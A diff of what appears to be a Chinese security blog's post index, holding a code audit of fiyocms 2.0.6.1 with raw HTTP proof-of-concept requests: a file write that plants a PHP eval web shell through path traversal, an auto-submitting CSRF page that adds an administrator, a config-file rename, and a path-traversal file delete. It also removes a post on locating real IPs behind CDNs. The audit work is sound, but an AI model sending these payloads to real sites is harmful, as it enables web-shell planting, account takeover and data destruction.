-<p>读取网站根目录下的config.php文件</p>
-<h3 id="文件上传漏洞">文件上传漏洞</h3>
-<h4 id="位置-4">位置</h4>
-<p><code>/dapur/apps/app_theme/libs/save_file.php</code> 第23-27行</p>
-<h4 id="分析-4">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&quot;src&quot;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = file_put_contents(<span class="variable">$f</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
-<p>没有过滤参数就拼接在file_put_contents函数中，构成文件上传漏洞</p>
-<h4 id="复现-4">复现</h4>
-<p>payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 97</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content&#x3D;&lt;?php eval($_POST[&#39;shell&#39;]); ?&gt;&amp;src&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php</span><br></pre></td></tr></table></figure>
-<h3 id="CSRF漏洞">CSRF漏洞</h3>
-<h4 id="位置-5">位置</h4>
-<p><code>/dapur/apps/app_user/sys_user.php</code> 第110-123行</p>
-<h4 id="分析-5">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;apply&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$us</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[user]&quot;</span>);</span><br><span class="line">	<span class="variable">$ps</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>);</span><br><span class="line">	<span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	preg_match(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$matches</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">		<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$_POST</span>[<span class="string">&#x27;kpassword&#x27;</span>] <span class="keyword">AND</span> </span><br><span class="line">		<span class="variable">$us</span>&gt;<span class="number">2</span> <span class="keyword">AND</span> <span class="variable">$ps</span>&gt;<span class="number">3</span> <span class="keyword">AND</span> @ereg(<span class="string">&quot;^.+@.+\\..+$&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) <span class="keyword">AND</span> !<span class="variable">$matches</span>) &#123;</span><br><span class="line">		<span class="variable">$qr</span>=<span class="variable">$db</span>-&gt;insert(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;<span class="subst">$user</span>&quot;</span>,<span class="string">&quot;<span class="subst">$name</span>&quot;</span>,MD5(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>),<span class="string">&quot;<span class="subst">$_POST</span>[email]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[status]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[level]&quot;</span>,date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[bio]&quot;</span>)); </span><br></pre></td></tr></table></figure>
-<p>没有加入token验证，所以可以造成CSRF攻击，可以添加超级用户</p>
-<h4 id="复现-5">复现</h4>
-<p>抓取添加用户的包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 138</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">apply&#x3D;Next&amp;id&#x3D;&amp;z&#x3D;&amp;user&#x3D;test555&amp;z&#x3D;&amp;x&#x3D;&amp;password&#x3D;123456&amp;kpassword&#x3D;123456&amp;email&#x3D;test555%40qq.com&amp;level&#x3D;1&amp;name&#x3D;test555&amp;status&#x3D;1&amp;bio&#x3D;test555</span><br></pre></td></tr></table></figure>
-<p>构造好的用于建立超级用户的网页代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://cms.cn/dapur/?app=user&amp;act=add&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apply&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Next&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;kpassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555<span class="symbol">&amp;#64;</span>qq<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;bio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.csrf.submit();</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>用户访问 <code>test.html</code>，就会立即生成test555的超级用户</p>
-<h3 id="任意文件修改漏洞">任意文件修改漏洞</h3>
-<h4 id="位置-6">位置</h4>
-<p><code>/dapur/apps/app_config/sys_config.php</code> 第190-193行</p>
-<h4 id="分析-6">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_new&#x27;</span>];</span><br><span class="line"><span class="variable">$old_folder</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;folder_old&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$old_folder</span> != <span class="variable">$new_folder</span>) &#123;</span><br><span class="line">	<span class="variable">$ok</span> = @rename(<span class="string">&quot;../<span class="subst">$old_folder</span>&quot;</span>,<span class="string">&quot;../<span class="subst">$new_folder</span>&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>对POST传递的参数<code>$folder_new</code>和<code>$folder_old</code>未进行过滤拼接至@rename函数进行文件名修改操作</p>
-<h4 id="复现-6">复现</h4>
-<p>payload如下:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;config HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 147</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">folder_new&#x3D;config.txt&amp;folder_old&#x3D;config.php&amp;config_save&#x3D;1&amp;site_name&#x3D;1&amp;site_title&#x3D;1&amp;site_url&#x3D;1&amp;site_status&#x3D;1&amp;site_title&#x3D;1&amp;file_allowed&#x3D;1&amp;file_size&#x3D;1</span><br></pre></td></tr></table></figure>
-<p>将网站根目录config.php文件修改成config.txt文件，然后直接访问该文件即可查看</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕过CDN寻找真实IP</title>
-    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
-    <content><![CDATA[<blockquote>
-<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
-</blockquote>
-<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
-<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
-<h2 id="二、子域名">二、子域名</h2>
-<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
-常用的子域名查找方法和工具：</p>
-<ol>
-<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
-<li>在线查询网站：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>子域名爆破工具</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
-<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
-<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
-<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
-<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
-<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
-<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
-SSL证书搜索引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
-<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
-<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
-国外多PING测试工具：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
-<h2 id="七、全网扫描">七、全网扫描</h2>
-<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
-<ol>
-<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
-<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
-<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
-<ul>
-<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
-<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VulnHub渗透之DC-2</title>
     <url>/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</url>
     <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
@@ -1299,6 +1114,132 @@ SSL证书搜索引擎：</p>
       </tags>
   </entry>
   <entry>
+    <title>fiyocms_2.0.6.1代码审计</title>
+    <url>/2020/10/21/fiyocms_2.0.6.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="全局分析">全局分析</h2>
+<h2 id="漏洞分析">漏洞分析</h2>
+<h3 id="任意文件删除">任意文件删除</h3>
+<h4 id="位置">位置</h4>
+<p><code>/dapur/apps/app_config/controller/backuper.php</code> 第16-30行</p>
+<h4 id="分析">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;		</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;database&#x27;</span>) &#123;		</span><br><span class="line">		@unlink(<span class="string">&quot;../../../../.backup/<span class="subst">$_POST</span>[file]&quot;</span>);		</span><br><span class="line">		<span class="keyword">if</span>(!file_exists(<span class="string">&#x27;../../../../.backup&#x27;</span>))</span><br><span class="line">			mkdir(<span class="string">&#x27;../../../../.backup&#x27;</span>);			</span><br><span class="line">		<span class="variable">$date</span> = md5(date(<span class="string">&quot;Ymd:His&quot;</span>));</span><br><span class="line">		<span class="variable">$file</span> = <span class="string">&quot;db-backup-<span class="subst">$date</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$c</span> = backup_tables(<span class="string">&quot;*&quot;</span>,<span class="string">&#x27;../../../../.backup&#x27;</span>,<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$c</span>) 		&#123;</span><br><span class="line">			<span class="variable">$size</span> = format_size(filesize(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));</span><br><span class="line">			<span class="variable">$time</span> = date(<span class="string">&quot;Y/m/d H:i:s&quot;</span>,filemtime(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));	</span><br><span class="line">			<span class="variable">$r</span> = <span class="string">&quot;<span class="subst">$size</span> - <span class="subst">$time</span>&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&#123; \&quot;file\&quot;:\&quot;<span class="subst">$file</span>.sql\&quot; , \&quot;info\&quot;:\&quot;<span class="subst">$r</span>\&quot; &#125;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>
+<p>通过POST传递的参数<code>file</code>没有经过任何处理就拼接进unlink函数进行文件删除操作</p>
+<h4 id="复现">复现</h4>
+<p>在网站根目录下建立<code>flag.php</code>文件<br>
+payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 27</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type&#x3D;database&amp;file&#x3D;..&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<p>第一次发送payload，没有.backup文件夹，会新建，第二次发送，flag.php已经成功删除</p>
+<h3 id="SQL注入漏洞">SQL注入漏洞</h3>
+<h4 id="位置-2">位置</h4>
+<p><code>/system/database.php</code>第210-233行</p>
+<h4 id="分析-2">分析</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$rows</span>,<span class="variable">$where</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$update</span> = <span class="string">&#x27;UPDATE &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; SET &#x27;</span>;</span><br><span class="line">      <span class="variable">$keys</span> = array_keys(<span class="variable">$rows</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$rows</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(is_string(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]]) <span class="keyword">AND</span> <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] !== <span class="string">&#x27;+hits&#x27;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&quot;&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] == <span class="string">&#x27;+hits&#x27;</span>) <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] = <span class="variable">$keys</span>[<span class="variable">$i</span>] . <span class="string">&#x27;+&#x27;</span>. <span class="number">1</span>;</span><br><span class="line">               <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]];</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Parse to add commas</span></span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$i</span> != count(<span class="variable">$rows</span>)<span class="number">-1</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">	</span><br><span class="line">      <span class="variable">$update</span> .= <span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$where</span>;			</span><br><span class="line"><span class="built_in">static</span> <span class="variable">$cons</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;connect();       </span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="variable">$update</span>);</span><br><span class="line">	<span class="variable">$query</span> = <span class="variable">$result</span> -&gt;execute();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
